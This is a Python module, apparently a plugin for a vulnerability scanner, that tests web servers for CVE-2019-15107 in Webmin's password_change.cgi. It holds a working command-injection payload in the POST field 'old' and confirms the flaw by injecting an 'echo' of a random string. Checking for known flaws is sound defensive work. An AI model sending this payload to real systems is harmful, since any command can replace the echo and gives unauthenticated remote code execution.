#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2019_15107_payloads = [
    {
        'path': 'password_change.cgi',
        'data': 'user=rootxx&pam=&expired=2&old=test|{RCECOMMAND}&new1=test2&new2=test2'
    },
]

def cve_2019_15107_scan(self, clients):
    ''' 该漏洞存在于密码重置页面(password_change.cgi), 允许未经身份验证的用户通过简单的POST请求执行任意命令
        当用户开启Webmin密码重置功能后, 攻击者可以通过发送POST请求在目标系统中执行任意命令, 且无需身份验证。
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2019-15107',
    }

    headers = {
        'Referer': '{}/session_login.cgi'.format(client.protocol_domain)
    }

    for payload in cve_2019_15107_payloads:
        randomStr = random_md5()
        RCEcommand = 'echo ' + randomStr
        
        path = payload['path']
        data = payload['data'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, randomStr)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
